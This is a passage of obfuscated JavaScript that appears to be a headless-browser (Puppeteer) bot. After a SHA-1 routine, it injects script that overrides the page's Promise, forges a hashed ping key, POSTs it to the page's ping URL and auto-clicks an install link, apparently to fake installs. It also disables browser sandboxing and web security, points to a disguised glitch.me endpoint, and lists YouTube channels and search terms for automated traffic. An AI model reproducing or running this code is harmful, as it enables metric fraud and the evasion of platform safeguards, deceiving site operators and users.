-0x182b + 0x158f & L) << y[0x1837 + -0xd74 + -0x2b * 0x40 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x7 * -0x545 + -0x17ba + -0x1 * -0x3cdd ? (this['block'] = P[0x9db * -0x2 + 0x2e * 0x5e + 0x2e2], this['start'] = N - (-0x1d0 * 0xa + -0x1873 * 0x1 + -0x2ad3 * -0x1), this['hash'](), this['hashed'] = 0xd90 + 0x1 * 0x1efd + -0x2c8c) : this['start'] = N;
                }
                return this['bytes'] > 0x5 * 0x437d2fd7 + 0x5a3 * -0x440add + 0x12e174c83 && (this['hBytes'] += this['bytes'] / (-0x3ed0ed5c * 0x8 + 0xcfaefdb8 + 0xa54 * 0x3555a2) << -0x101f + 0x1 * 0x5d + 0x1 * 0xfc2, this['bytes'] = this['bytes'] % (-0xf8a0ba24 + -0x61 * -0x1e467c + 0x1ed280528)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1 * 0x1dd + -0x236 * -0xd + -0x2 * 0xf4d;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x6fc + 0x865 * -0x2 + 0x17d6] = this['block'], J[K >> 0xf2f * 0x1 + -0x4 * -0x5b1 + -0x25f1] |= x[-0x1 * -0x1a5 + 0x24ef + -0x2691 & K], this['block'] = J[-0x1 * -0x1400 + -0x41d + -0xfd3], K >= 0x289 * 0xb + 0x551 + 0x20fc * -0x1 && (this['hashed'] || this['hash'](), J[0x1f83 + 0x1d3 * -0x3 + -0x1a0a] = this['block'], J[0x118a + -0x1 * -0x11f1 + -0x236b] = J[0x1192 + 0x22f0 * 0x1 + -0x1 * 0x3481] = J[0x86b * -0x1 + -0x1a02 + -0xd7 * -0x29] = J[-0x676 + -0x115d * -0x1 + -0xae4] = J[0xa60 + 0x7 * 0x3df + -0x2575] = J[-0x259 * 0xb + -0x18ce + -0x3 * -0x10e2] = J[0x7 * -0x41a + -0x184 * -0xc + 0xa8c] = J[0x2a * 0x7 + -0x2 * -0x9e1 + -0x5 * 0x42d] = J[0x15c1 + -0x1575 + -0x44 * 0x1] = J[-0x29 * -0xad + -0x1938 * -0x1 + 0xa94 * -0x5] = J[0x3 * 0x8da + 0xcf8 + -0x214 * 0x13] = J[-0x1141 + -0xd69 * 0x1 + -0x1 * -0x1eb5] = J[0xa90 * 0x1 + -0x315 + -0x76f] = J[-0x2f2 + -0x47 * -0x25 + -0x3 * 0x26c] = J[-0x1870 + 0x19e4 + -0x166] = J[0x25fb + 0x1 * 0x569 + 0x1 * -0x2b55] = -0x7b4 * 0x2 + -0x1ad0 + 0x2a38), J[0x15e6 + -0x8b * 0x6 + -0x1296] = this['hBytes'] << 0x1fb * -0x5 + 0x8c7 * -0x2 + 0x1b78 | this['bytes'] >>> 0x12d1 + -0x2308 + 0x1054, J[-0x1e18 + 0x500 + 0x1927] = this['bytes'] << -0x214f * -0x1 + 0x496 * 0x4 + -0x33a4, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1 * 0x2511 + 0x38f + -0x2890; J < 0x21c2 + -0xa * -0x1ff + -0x8 * 0x6ad; ++J)
                K = Q[J - (-0x2223 + 0x914 + -0x1 * -0x1912)] ^ Q[J - (0x49d * 0x1 + 0x924 + -0x493 * 0x3)] ^ Q[J - (0x1 * 0x229b + 0x209 * -0x1 + -0x1 * 0x2084)] ^ Q[J - (-0x1 * 0x2151 + 0x1687 * -0x1 + 0x8 * 0x6fd)], Q[J] = K << 0xda3 + -0x1675 * -0x1 + -0x1 * 0x2417 | K >>> 0x2 * 0x59b + -0x1a45 * 0x1 + 0xf2e;
              for (J = -0x11 * 0x2b + 0x169b * 0x1 + -0x13c0; J < -0x18b * 0xe + -0xa77 * 0x3 + 0x15 * 0x287; J += 0x6c * 0xf + 0x1d1a + 0xf5 * -0x25)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2629 + 0x1226 + -0x384a | L >>> -0x93b * 0x4 + -0x1725 + -0xf0b * -0x4) + (M & N | ~M & O) + P + (-0x41e * 0xd2ccd + -0x11e36386 + 0xa2a45125) + Q[J] << 0x1186 + -0x1ef7 + -0x6f * -0x1f) << -0x7fc + -0xa02 + -0x3 * -0x601 | P >>> -0xe38 + 0xe10 + 0x43 * 0x1) + (L & (M = M << -0xbc0 + 0x23f3 + -0x1815 | M >>> -0x26bf + 0x356 + 0x236b) | ~L & N) + O + (0x411a67 * 0x185 + 0x14902ce * 0x6d + -0x9480d6a0) + Q[J + (0x101 * -0x9 + 0x28 * -0xce + 0x293a)] << 0xa82 + 0x241c + -0x2e9e) << 0x1 * -0x1e1f + 0x1 * -0xa49 + 0x286d | O >>> -0x754 * 0x3 + -0x1 * -0x61f + -0x2 * -0x7fc) + (P & (L = L << -0x91b + 0x2257 + -0x5 * 0x506 | L >>> 0xba9 + -0x14cd + 0x2 * 0x493) | ~P & M) + N + (0x45a88e11 + -0x83d2b2 * -0x9d + -0x3bfe4ba2) + Q[J + (0x1f6 + 0x94b + -0xb3f)] << -0x1643 + 0x124 + 0x151f) << -0x672 * 0x1 + 0x1e3 + 0x494 * 0x1 | N >>> -0x2 * -0xfe0 + -0x2301 + 0x35c) + (O & (P = P << 0xf98 + 0xa * 0x39 + -0x2c * 0x67 | P >>> -0x1a8 * 0x13 + -0x1772 * -0x1 + 0x404 * 0x2) | ~O & L) + M + (0x8230acfd + 0x99b6a8f7 + -0xc164dc5b) + Q[J + (-0xb50 + 0x3 * 0x147 + -0x2 * -0x3bf)] << -0x1f91 + 0xaed + -0x14a4 * -0x1) << 0x1e46 + -0x669 * 0x1 + -0x17d8 | M >>> 0x1 * 0x13f5 + -0x1 * 0x1dd7 + 0x9fd) + (N & (O = O << 0x5 + -0x293 * 0xd + 0x2190 | O >>> 0x1ac0 + 0x2 * 0x86d + -0x2b98) | ~N & P) + L + (-0x175 * 0x429341 + -0xe64df1d + 0x8c74ccd * 0x17) + Q[J + (-0x19cd + 0x959 + 0x1 * 0x1078)] << 0x1 * 0x12cb + -0x12f5 * -0x2 + -0x9 * 0x64d, N = N << -0x8f2 * -0x3 + -0x3b * 0x61 + -0x45d * 0x1 | N >>> 0x2c4 * -0xc + -0x3a7 * -0x3 + 0x163d;
              for (; J < -0xd03 + 0x1d08 * 0x1 + -0xfdd; J += 0x1 * 0xcca + -0x2f * 0x4f + -0x94 * -0x3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x751 + 0x33c + 0x2 * 0x20d | L >>> -0x1 * -0xa4 + -0x187 + 0xfe) + (M ^ N ^ O) + P + (0x303 * -0x25ceba + 0x8c929286 + 0x5424f349 * 0x1) + Q[J] << -0x2b9 * -0x9 + -0x1 * 0x1 + -0x188 * 0x10) << 0x2532 + 0xb19 + -0xa7 * 0x4a | P >>> 0x1 * 0xbf + -0xa5d * -0x3 + -0x1fbb) + (L ^ (M = M << 0x1d26 + 0x4a6 * 0x3 + -0x2 * 0x157d | M >>> 0xc1d * -0x3 + 0x1c17 + -0x97 * -0xe) ^ N) + O + (-0x42312f0a + -0x12697182 * -0x9 + 0xb561d19) + Q[J + (-0x10 * -0x86 + -0x2 * 0x114d + -0x53f * -0x5)] << -0xd96 + -0x1e2a + 0xaf * 0x40) << -0x3 * 0xbb5 + 0x2137 + 0x1ed | O >>> -0x1 * -0x1f8f + 0x2571 + -0x44e5) + (P ^ (L = L << 0x229a + -0x1911 + -0x96b | L >>> -0x19d4 + -0x1807 + -0x5 * -0x9f9) ^ M) + N + (0x8d04cf29 + -0xfe7c082 + 0x35 * -0x44e3ae) + Q[J + (0x1 * 0x1c2d + -0x1b84 + -0xa7)] << 0xa6f + -0x1 * 0x1f5a + 0x14eb) << 0x3f6 + -0x1773 + 0x1382 | N >>> -0xa09 * -0x1 + -0x1950 + 0xf62) + (O ^ (P = P << 0x31d * 0x6 + 0x22ed * 0x1 + -0x357d | P >>> 0x570 + -0x11dd * 0x1 + 0xc6f) ^ L) + M + (-0xbf2ddcf3 + 0x6303cdfb + 0xcb03fa99) + Q[J + (-0x220b + 0xb9f + 0x166f)] << 0x3ec + -0x1311 * -0x1 + -0x16fd) << 0x1a0 * -0x8 + -0x258c + 0x3291 | M >>> -0x23 * -0x8e + 0x16 * -0x13f + 0x19 * 0x53) + (N ^ (O = O << -0x32 * 0xf + -0x213d + 0x2449 | O >>> -0x1 * -0x220e + 0xa * 0x236 + 0x3 * -0x12b8) ^ P) + L + (-0x1 * 0x5cfb336f + 0x1 * -0x9c9a0bda + 0x1686f2aea) + Q[J + (-0xe09 + 0x9a9 * -0x1 + 0x17b6)] << 0x1 * 0x1713 + 0x4a0 + -0x1bb3, N = N << 0xb9 + -0x60 + -0x3b | N >>> 0x1 * -0x16a1 + 0xbce + -0xad5 * -0x1;
              for (; J < -0x1a83 + 0x2547 + -0x1 * 0xa88; J += 0xb3e * -0x3 + -0x22b2 + -0x9c7 * -0x7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1ae7 + 0x1db + 0x1911 | L >>> 0x106a + -0x241d + 0x13ce) + (M & N | M & O | N & O) + P - (0x70d19f4 * 0x16 + -0x94cb9c2e + 0x6a8fa45a) + Q[J] << -0x23ec + -0x13f7 + 0x37e3) << 0x1 * 0x1db4 + -0x23bb + 0x24 * 0x2b | P >>> 0x1eda + 0x192f + -0x37ee) + (L & (M = M << -0x12c2 + -0x19d2 + 0x2cb2 | M >>> 0x18b7 + 0x235 * -0xf + 0x2 * 0x433) | L & N | M & N) + O - (-0xc6c24bb1 + 0xd76c1a99 + 0x1 * 0x603a743c) + Q[J + (-0x1af * 0x9 + 0xe3d + 0xeb)] << 0xb15 * -0x2 + -0x2 * 0x443 + 0x1eb0) << -0x1dc7 + -0x1d * -0x62 + 0x12b2 | O >>> -0x19 * 0x6d + -0x17a + -0x1 * -0xc3a) + (P & (L = L << -0x1f4a + -0x6bf * 0x1 + 0x2627 * 0x1 | L >>> 0x30d + 0x13af * 0x1 + 0x16ba * -0x1) | P & M | L & M) + N - (0x1 * -0x30a4b4bb + -0x54d4 * 0x1e085 + 0x5 * 0x4026e867) + Q[J + (0x691 + 0x1 * -0x48c + -0x203)] << -0x20ea + -0x130c + -0x12 * -0x2e3) << -0x34b + 0x17bb + -0x146b | N >>> -0x1 * 0x2011 + 0x1f38 + -0xf4 * -0x1) + (O & (P = P << -0x1 * -0x2483 + -0x74 * -0x8 + -0x2ab * 0xf | P >>> -0xdcc + 0x1641 + -0x873) | O & L | P & L) + M - (0x5f6b41e1 + -0x46a83037 + -0x1 * -0x5821317a) + Q[J + (-0x2a * -0x6 + 0x2fa * -0x9 + 0x19d1)] << -0x1f0e + 0xdf9 + 0x1115) << -0x2570 * 0x1 + 0x2 * -0xdf6 + -0x15 * -0x31d | M >>> 0xd40 + -0x3 * -0xc22 + -0x318b) + (N & (O = O << 0x1153 * 0x1 + 0x1 * -0x116 + -0x101f | O >>> -0x5a5 * -0x5 + -0x243c + 0x805) | N & P | O & P) + L - (-0x8cf14db9 + 0x324643f1 + 0x7451e2d * 0x1c) + Q[J + (0x1d1c + 0x2230 + -0x3f48)] << 0x4 * -0x571 + 0x545 + 0x67 * 0x29, N = N << 0x30b * -0x5 + 0x18b9 + 0x4b2 * -0x2 | N >>> -0x68a + -0x21d * -0x5 + -0x93 * 0x7;
              for (; J < 0x25 * -0x6f + 0x4e * 0x3d + -0x23b * 0x1; J += -0xf4d * 0x1 + 0xb39 * -0x2 + -0x1 * -0x25c4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1173 + 0x1da6 + -0x2f14 | L >>> 0x14fa + -0x26 * 0x26 + 0x22d * -0x7) + (M ^ N ^ O) + P - (-0x5d44ad9 * 0x3 + -0x227a4572 * 0x1 + 0x1 * 0x69946427) + Q[J] << -0x1692 + -0x2615 + 0x3ca7) << 0x10f5 + -0x8f * -0xf + -0x1951 | P >>> 0xa50 + -0x19 * 0x15d + 0x17e0) + (L ^ (M = M << 0x7eb * -0x3 + 0xe89 + 0x956 | M >>> -0x801 * -0x1 + -0x3 * 0xb3a + 0x1 * 0x19af) ^ N) + O - (-0x5c66e1bb + 0x31f32374 * 0x1 + 0x16f0f3b * 0x43) + Q[J + (0x5 * 0x44d + 0x1 * 0x1fb2 + -0x16 * 0x26b)] << -0x9d * 0x31 + -0x82d + 0x263a) << -0x3a * 0x9b + 0x137d + 0xfa6 | O >>> -0x1647 + -0x2529 + 0x3 * 0x13d9) + (P ^ (L = L << 0x14d5 * 0x1 + 0x1 * 0x1ebe + 0x3 * -0x1127 | L >>> 0x923 + 0xf54 + -0x1875) ^ M) + N - (0x5b6dd343 + -0xc39a022 + -0x1996f4f7) + Q[J + (-0x17f9 + -0x37b * 0x1 + 0x1b76)] << -0x10d8 + -0x243 * -0x2 + -0x1 * -0xc52) << -0x3b * -0x43 + -0x10af + 0x143 | N >>> 0xe * -0x79 + 0x59 * -0x67 + 0x1544 * 0x2) + (O ^ (P = P << -0xb3e * 0x1 + -0x2157 + 0x2cb3 | P >>> -0xd94 + 0x4 * -0x897 + 0x2ff2) ^ L) + M - (-0x6d3 * 0x1d1b3 + 0x2 * -0x10871601 + 0x1 * 0x631572b5) + Q[J + (0x7df + 0x1d17 * -0x1 + -0x43f * -0x5)] << -0x1202 * 0x1 + 0x182 + 0x1080) << -0x175 * 0x2 + 0xdeb * 0x2 + -0x33 * 0x7d | M >>> -0x26b7 + 0x3a * 0x68 + 0xf42) + (N ^ (O = O << 0x21e2 + -0xa4a + -0x177a | O >>> -0x7b * 0x2d + 0x65d + -0x1 * -0xf44) ^ P) + L - (-0x3e470ee6 + -0x1c7baa5f * -0x1 + -0x117b53bd * -0x5) + Q[J + (0x244d * -0x1 + 0x77c * -0x3 + -0xbc1 * -0x5)] << 0x3f * -0x59 + -0x1957 + 0x2f3e, N = N << 0x1473 + 0x1b20 * -0x1 + 0x6cb | N >>> -0x42b + -0xdd0 + 0x11fd;
              this['h0'] = this['h0'] + L << -0xf5 * 0x2 + -0x1 * 0xbce + 0x2 * 0x6dc, this['h1'] = this['h1'] + M << 0x54e * -0x7 + -0x1 * -0x5b8 + 0xfb5 * 0x2, this['h2'] = this['h2'] + N << -0xf40 + -0x24ec + 0x342c, this['h3'] = this['h3'] + O << 0x1 * -0xb6f + -0x3ec * -0x5 + -0x82d, this['h4'] = this['h4'] + P << -0x1a45 + -0x23c1 * 0x1 + 0x3e06;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x775 * -0x3 + 0x1 * -0xa07 + 0x2082 & -0x1389 * 0x1 + 0x2378 + -0xfe0] + w[J >> -0x1a93 + 0x1 * -0x173d + 0x31e8 & -0x988 + -0x9b0 + 0xeb * 0x15] + w[J >> -0x71 * -0xe + -0x827 + 0x20d & -0x24e4 + -0x171a + -0x1 * -0x3c0d] + w[J >> -0x8ad + -0x4 * -0x91f + 0x1 * -0x1bbf & -0x2599 + 0x583 * 0x2 + -0xd51 * -0x2] + w[J >> 0x58f * 0x1 + -0x1581 + 0xffe & -0x1624 + -0x5 * 0x72d + 0x426 * 0xe] + w[J >> -0x20a7 + -0x47 * -0xa + 0x1de9 & -0xa * -0x113 + -0x196f + 0xec0] + w[J >> -0xc11 * -0x3 + 0x1 * -0x214a + -0xf7 * 0x3 & -0xb72 * -0x1 + 0x263a + -0x319d] + w[0x1 * -0x209b + -0x1 * 0x2359 + 0x2f5 * 0x17 & J] + w[K >> -0x4bb * -0x5 + -0xa21 + 0xd6a * -0x1 & 0x9ee * -0x3 + 0x55 * -0x23 + 0x2978] + w[K >> -0x12a + -0xae7 * 0x3 + 0x21f7 & 0x43 * 0x8e + 0x1 * 0x19f8 + 0x1 * -0x3f13] + w[K >> 0x3 * -0x71f + -0xe5a + 0x23cb & 0x421 + -0x16a2 + 0x1290] + w[K >> 0x49 * 0x11 + 0x1 * 0x95d + -0xe26 & -0x6 * 0x3c7 + -0x25b5 + -0x77 * -0x82] + w[K >> -0x2683 + 0xb9 * 0x12 + 0x198d & 0x17cb + -0x213 + -0x455 * 0x5] + w[K >> -0x1421 + 0x4b * 0x6b + 0x166 * -0x8 & 0x7 * 0x121 + -0x1097 + -0x8bf * -0x1] + w[K >> -0x6df + -0xe7d * 0x1 + 0x1560 & 0x39f * -0x8 + -0x1 * -0x1c4b + -0x5e * -0x2] + w[-0x121 * -0xd + 0x2477 + -0x3315 & K] + w[L >> -0x38d + -0x5e9 + 0x1 * 0x992 & -0x3b * 0x21 + 0x1e00 + -0x1656] + w[L >> -0x25d3 + 0x1413 + 0x11d8 & -0x21b4 + 0x155 * -0xb + 0x306a] + w[L >> 0x49f + -0x61 * 0x2 + 0x1 * -0x3c9 & 0x1 * -0x7ac + 0xbbe + -0x403 * 0x1] + w[L >> 0x1482 + 0x16a1 + -0x1 * 0x2b13 & -0x36f + 0x5 * 0x3b4 + -0xf06] + w[L >> -0x187f + 0x68c * -0x4 + 0x32bb & -0x1 * -0x14c0 + 0x71f + -0x1bd0] + w[L >> 0x1399 + 0x2267 * 0x1 + -0x2 * 0x1afc & -0x1 * 0x1d27 + -0x880 + -0x1 * -0x25b6] + w[L >> 0x2394 + 0xa83 + 0x695 * -0x7 & -0x760 + 0x11 * -0xce + 0x151d] + w[0x127f * -0x1 + 0x11 * 0x22d + -0x126f & L] + w[M >> -0x157f + -0x1b96 + 0x3131 & 0x26a8 + -0x2519 * -0x1 + -0x4bb2] + w[M >> 0x102 + -0x1 * -0xa7b + -0xb65 & -0x5ff * 0x1 + -0x141 * 0x1d + 0x2a6b] + w[M >> 0xee6 + -0x23 * 0x17 + 0x1 * -0xbad & -0x1172 + 0x106e + -0xb * -0x19] + w[M >> 0x1262 + -0x728 + -0x1 * 0xb2a & -0x11eb * -0x1 + -0x3 * 0x9d + -0x1005] + w[M >> -0x3b4 * -0x3 + -0x1 * -0x1079 + -0x3ef * 0x7 & 0x1 * 0x93d + 0x26a1 + -0x2fcf] + w[M >> -0x71 * -0x1f + 0x819 + -0x15c0 & -0x23fd + -0x8 * 0x52 + 0x269c] + w[M >> 0x1738 + -0xa57 * -0x2 + -0x52 * 0x89 & -0x9b8 + 0x19b3 * -0x1 + 0x1 * 0x237a] + w[-0x1 * 0x1025 + -0x1e21 + -0x199 * -0x1d & M] + w[N >> -0x1 * 0x2363 + 0x1ca8 + -0x11 * -0x67 & -0x1a81 + 0x1 * -0xf73 + 0x867 * 0x5] + w[N >> -0x1 * 0x1cff + -0xec3 + 0x6 * 0x74f & -0x26f7 + 0x1582 * -0x1 + 0x4a8 * 0xd] + w[N >> 0x13 * 0x137 + -0x1550 + 0x1b1 * -0x1 & 0x1f * 0x1a + -0xc39 + -0x1 * -0x922] + w[N >> 0x2010 + -0x1380 + -0xc80 & -0x1496 + 0x1 * -0x1a66 + 0x1 * 0x2f0b] + w[N >> -0x1 * 0x1baa + -0x1c4b + -0xf3 * -0x3b & 0x1db0 + 0x1b * 0xf5 + -0x3778] + w[N >> -0x5 * 0x63b + -0x9 * 0x8e + 0x242d & -0x81d + 0x213f * 0x1 + -0x395 * 0x7] + w[N >> -0x2 * 0xfe2 + -0x1 * -0x1046 + 0xf82 & 0x24c7 + 0x1 * -0x84d + -0x1c6b] + w[0x7b5 * -0x1 + 0x1842 + -0x107e & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x3fb + 0x80b + -0x3f8 & 0x7bb * -0x1 + 0x26cc + -0x1e12,
                J >> -0x3 * -0x8bd + 0x2397 + -0x3dbe & -0x3 * 0x943 + -0x1 * -0x28f + -0x7 * -0x3bf,
                J >> -0x51 * 0x3 + 0x3d * 0x5 + -0x36 & 0x2646 * -0x1 + 0x95b * -0x1 + 0x30a0,
                0x2 * 0x349 + 0x1 * -0xb22 + -0x1 * -0x58f & J,
                K >> -0x1 * 0xcd7 + 0xd9 * 0xb + -0x1ce * -0x2 & 0x3 * -0x394 + -0x2 * 0x455 + 0x1465,
                K >> -0xd41 + -0x254a + 0x329b & -0xf29 * 0x1 + 0xa * -0x4 + 0x1050,
                K >> -0x115 * -0xd + -0x1705 + -0xe6 * -0xa & 0x1c0 * -0x1 + 0x325 * -0x5 + 0x1278,
                -0x16e9 + 0xb92 + -0x2 * -0x62b & K,
                L >> -0x2 * 0xc0a + 0x7 * -0x1e5 + 0x256f & -0x1 * 0x97c + -0x61f + 0x352 * 0x5,
                L >> 0xb * -0x1a8 + 0x1 * 0xf6d + 0x2db & -0x2675 + -0x1894 + 0x4 * 0x1002,
                L >> -0xe6a + 0x1f * 0x5 + 0xdd7 & 0x1045 + 0x1 * -0x2030 + 0x10ea,
                0x10bd + 0x71d * 0x4 + -0x2 * 0x1619 & L,
                M >> 0x230e + -0x1 * -0x6ee + -0x29e4 & 0x6b * 0x5 + 0x1 * 0x4d + -0x1 * 0x165,
                M >> 0x18b8 + 0x2 * 0x1178 + -0x4 * 0xee6 & 0x1c2b + 0x131d * 0x2 + -0x16 * 0x2f9,
                M >> -0x15b + -0x891 + 0x9f4 & -0xc96 + -0x1 * 0xeb6 + -0x1c4b * -0x1,
                -0x38c * 0x7 + 0x2 * 0x18b + 0x16bd & M,
                N >> -0x1f2b + 0x1e12 + 0x131 & 0x1 * 0x2366 + -0x1bb9 * -0x1 + -0x3e20,
                N >> 0x1a2d + -0x62f + -0x13ee & 0x1 * 0xa2d + 0x2 * -0x11a5 + 0x1a1c,
                N >> -0x1edd + -0x231d + 0x11 * 0x3e2 & -0x2266 + 0x252a + -0x1c5,
                0xbbd + 0xa79 * 0x2 + -0x10 * 0x1fb & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x838 * -0x3 + 0x348 * 0x1 + -0x1bdc), (K = new DataView(J))['setUint32'](0x238a + 0x9 * 0x125 + 0x5 * -0x92b, this['h0']), K['setUint32'](0xb * -0x2cf + -0x1 * -0x1a3 + 0x1d46, this['h1']), K['setUint32'](-0x8 * 0x1bb + -0x1 * 0xee8 + -0x133 * -0x18, this['h2']), K['setUint32'](0x1229 + 0x1313 + 0x770 * -0x5, this['h3']), K['setUint32'](-0x6 * 0x402 + -0x1f65 + 0x445 * 0xd, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x13da + 0xf * -0x257 + 0xf3f];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x24e9 + 0x1752 + 0x31 * 0x47;
            J[0x1e76 + 0x7 + -0x1e7d]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x21c0 + 0x1bf0 + -0x3db0] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x2108 + 0x1a15 + 0x6f4), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x14b3 + -0xcf7 * 0x1 + -0x7bb;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1b3f + -0x1 * -0x14cf + 0x1 * 0xc4c), Promise['resolve'](-0xae9 + -0x1da1 + 0x288b);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x3 * -0xb65 + 0x1 * -0x119f + -0x5 * 0x350; j < -0x11 * 0x20f + -0xf13 + -0x1 * -0x3213; j++)
    i();
}
const NETWORK_PATIENCE = 0x1 * -0x3cb5 + 0x2bcb * 0x1 + 0x302a + (-0x2423 + -0xb * 0x2 + -0x3 * -0xffb) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1 * 0x103f + -0x1 * -0x19c2 + 0x4 * -0x260) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x17c1 * -0x1 + 0x4d * 0x5f + -0x4d2; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const U = b;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this[U(0x3, 'G$)R')] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + V(0x6) + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + 